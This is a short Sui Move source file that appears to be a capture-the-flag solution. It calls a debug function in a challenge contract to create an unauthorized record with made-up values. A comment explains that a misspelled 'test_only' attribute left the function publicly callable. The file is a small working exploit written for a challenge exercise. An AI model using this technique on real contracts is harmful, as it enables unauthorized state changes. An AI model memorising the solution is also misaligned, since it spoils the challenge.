module vending_machine::versionC {

    use sui::tx_context::{TxContext};
    use std::string::Self;
    use retetomat::version4::{Self, WhiteList};
    
    public entry fun solve( 
        _whitelist: &mut WhiteList, 
        ctx: &mut TxContext
    ) {
        // There is a typo in the challenge which is "test_cnly" instead of "test_only"
        retetomat::version4::debug_reteta_creation(
            string::utf8(b"zeroc"),
            string::utf8(b"test"),
            200,
            string::utf8(b"04.01.2024"),
            vector<string::String>[string::utf8(b"Onasemnogene"), string::utf8(b"Onasemnogene")],
            string::utf8(b"http://zeroc.com"),
            ctx
        );
    }
}